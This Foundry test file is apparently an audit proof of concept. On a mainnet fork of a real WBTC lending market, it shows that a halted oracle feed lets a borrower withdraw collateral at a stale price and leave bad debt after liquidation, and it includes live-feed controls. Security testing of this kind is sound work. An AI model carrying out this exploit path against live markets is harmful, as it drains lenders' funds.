// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {IERC20, IFeed, IMarket, IOracle, IBorrowController, IDBR, IEscrow} from "../src/Interfaces.sol";

/// L-2: staleness is gated ONLY on the borrow path. BorrowController.
/// isPriceStale is consulted exclusively by borrowAllowed; Market.withdraw
/// and Market.liquidate consume oracle.getPrice with no age gate -- the
/// M-17 / Nomoi-#4 stale-answer root was fixed only in the borrow sibling.
///
/// Scenario (WBTC market, local fork): a position is opened at price P0.
/// The top-level feed then HALTS (mocked latestRoundData frozen at P0 with
/// its original updatedAt -- exactly what consumers see when an underlying
/// aggregator stops updating). Time passes beyond the market's staleness
/// threshold. Control A: borrow now reverts (gate works). Attack: withdraw
/// still succeeds up to the STALE valuation. The feed then resumes at the
/// true price P1 = 0.6 * P0: the position is left undercollateralized and
/// max liquidation leaves bad debt. Control B repeats the price drop with
/// a LIVE feed: the same withdrawal reverts and no bad debt is created.
///
/// Scaffolding (not part of the claim): BorrowController operator is
/// impersonated once to allowlist the test borrower (mirrors allowlisted
/// integrator contracts); DOLA dealt to the market (mirrors Fed supply);
/// DBR dealt to the borrower (mirrors DBR held from the open market).
contract L2StalenessTest is Test {
    uint256 constant FORK_BLOCK = 26436361;

    address constant MKT = 0x48BA574Edf0bc4E2E40B529863aaA6a67c264E7C; // WBTC market
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant FEED = 0xd66b3f73BD85dfb52d01E5EF56dB29B75730B3DC; // ChainlinkBridgeAssetFeed
    address constant DOLA = 0x865377367054516e17014CcdED1e7d814EDC9ce4;
    address constant BC = 0x01ECA33e20a4c379Bd8A5361f896A7dd2bAE4ce8;
    address constant BC_OPERATOR = 0x926dF14a23BE491164dCF93f4c468A50ef659D5B;

    address liquidator = address(0x119);

    IMarket mkt = IMarket(MKT);
    IBorrowController bc = IBorrowController(BC);
    IDBR dbr;
    IOracle oracle;

    uint256 constant DEBT = 100_000 ether;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        dbr = IDBR(mkt.dbr());
        oracle = IOracle(mkt.oracle());

        vm.prank(BC_OPERATOR);
        bc.allow(address(this));
        deal(DOLA, MKT, 2_000_000 ether);
        deal(DOLA, liquidator, 1_000_000 ether);
        vm.prank(liquidator);
        IERC20(DOLA).approve(MKT, type(uint256).max);

        // Top up the daily-limit drip (+90 min refills ~125K of the 2M/day
        // drip). Kept short on purpose: the WBTC/BTC leg of the bridge feed
        // is ~19.9h old at the fork block, and a longer warp would trip the
        // market's own 86460s staleness gate for the setup borrow itself.
        vm.warp(block.timestamp + 90 minutes);
        vm.roll(block.number + 450);
    }

    function _openPosition() internal returns (uint256 p0, uint256 frozenUpdatedAt) {
        deal(WBTC, address(this), 4e8); // 4 WBTC
        deal(address(dbr), address(this), 20_000_000 ether);
        IERC20(WBTC).approve(MKT, type(uint256).max);
        mkt.deposit(4e8);
        (, int256 p,, uint256 upd,) = IFeed(FEED).latestRoundData();
        p0 = uint256(p);
        frozenUpdatedAt = upd;
        mkt.borrow(DEBT);
        console.log("position opened: 4 WBTC collateral, debt:", mkt.debts(address(this)));
        console.log("feed price P0:", p0);
        console.log("market staleness threshold (s):", bc.stalenessThreshold(MKT));
        console.log("liquidation incentive bps:", mkt.liquidationIncentiveBps());
    }

    function _mockFeed(uint256 price, uint256 updatedAt) internal {
        vm.mockCall(
            FEED,
            abi.encodeWithSelector(IFeed.latestRoundData.selector),
            abi.encode(uint80(1), int256(price), uint256(0), updatedAt, uint80(1))
        );
    }

    /// Repeatedly liquidate the maximum feasible amount (respecting the
    /// market's per-call liquidation factor and the escrow's payout bound)
    /// until the position is healthy or nothing more can be repaid.
    /// Returns the residual debt.
    function _maxLiquidateResidual() internal returns (uint256 residual) {
        for (uint256 i = 0; i < 12; i++) {
            uint256 debt = mkt.debts(address(this));
            if (debt == 0) break;
            if (mkt.getCreditLimit(address(this)) >= debt) break; // healthy: not liquidatable
            uint256 escBal = IEscrow(mkt.predictEscrow(address(this))).balance();
            if (escBal == 0) break;
            uint256 price = oracle.viewPrice(WBTC, mkt.collateralFactorBps());
            uint256 inc = mkt.liquidationIncentiveBps();
            uint256 maxRepay = escBal * price / 1e18 * 10000 / (10000 + inc);
            uint256 factorCap = debt * mkt.liquidationFactorBps() / 10000;
            if (maxRepay > factorCap) maxRepay = factorCap;
            maxRepay = maxRepay * 999 / 1000;
            if (maxRepay == 0) break;
            vm.prank(liquidator);
            try mkt.liquidate(address(this), maxRepay) {} catch {
                break;
            }
        }
        residual = mkt.debts(address(this));
    }

    function test_Halt_WithdrawAtStalePrice_CreatesBadDebt() public {
        (uint256 p0, uint256 frozenUpd) = _openPosition();

        // Feed halts at P0. 25 hours pass (threshold is 86460s ~ 24h).
        _mockFeed(p0, frozenUpd);
        vm.warp(block.timestamp + 25 hours);
        vm.roll(block.number + 7500);
        console.log("isPriceStale after 25h halt:", bc.isPriceStale(MKT));
        assertTrue(bc.isPriceStale(MKT), "borrow gate must see the halt");

        // CONTROL A: the borrow path is gated -- new borrows are denied.
        vm.expectRevert();
        mkt.borrow(1 ether);
        console.log("CONTROL A passed: borrow reverts while feed is stale");

        // ATTACK: withdraw has no gate. Pull collateral up to the STALE limit.
        uint256 limit = mkt.getWithdrawalLimit(address(this));
        console.log("withdrawal limit at stale price:", limit);
        mkt.withdraw(limit);
        console.log("withdrew WBTC (raw):", limit);
        console.log("escrow balance after withdraw:", IEscrow(mkt.predictEscrow(address(this))).balance());

        // Feed resumes at the true price, 40% lower.
        uint256 p1 = p0 * 60 / 100;
        _mockFeed(p1, block.timestamp);
        console.log("feed resumed at P1:", p1);
        console.log("collateral value at resumed price:", mkt.getCollateralValue(address(this)));
        console.log("debt:", mkt.debts(address(this)));

        uint256 residual = _maxLiquidateResidual();
        console.log("residual debt after max liquidation (= bad debt):", residual);
        assertGt(residual, 0, "bad debt must remain after max liquidation");
    }

    function test_LiveFeed_SameDrop_NoBadDebt() public {
        (uint256 p0,) = _openPosition();
        uint256 staleStyleLimit = mkt.getWithdrawalLimit(address(this));

        // Price drops 40% but the feed is LIVE (fresh updatedAt throughout).
        uint256 p1 = p0 * 60 / 100;
        _mockFeed(p1, block.timestamp);
        vm.warp(block.timestamp + 25 hours);
        vm.roll(block.number + 7500);
        _mockFeed(p1, block.timestamp); // still fresh after the warp
        console.log("isPriceStale with live feed:", bc.isPriceStale(MKT));
        assertFalse(bc.isPriceStale(MKT));

        // The stale-sized withdrawal now reverts: the limit tracks the live price.
        vm.expectRevert();
        mkt.withdraw(staleStyleLimit);
        console.log("CONTROL B passed: stale-sized withdraw reverts against a live feed");

        // Withdrawing the true (smaller) limit leaves a fully covered position:
        // after exhausting liquidations, either no debt remains or the debt
        // that remains is still covered by the remaining collateral.
        uint256 trueLimit = mkt.getWithdrawalLimit(address(this));
        console.log("true withdrawal limit:", trueLimit);
        mkt.withdraw(trueLimit);
        uint256 residual = _maxLiquidateResidual();
        console.log("residual debt after max liquidation:", residual);
        console.log("collateral value of what remains:", mkt.getCollateralValue(address(this)));
        assertTrue(
            residual == 0 || mkt.getCollateralValue(address(this)) >= residual,
            "no bad debt when the feed is live"
        );
    }
}
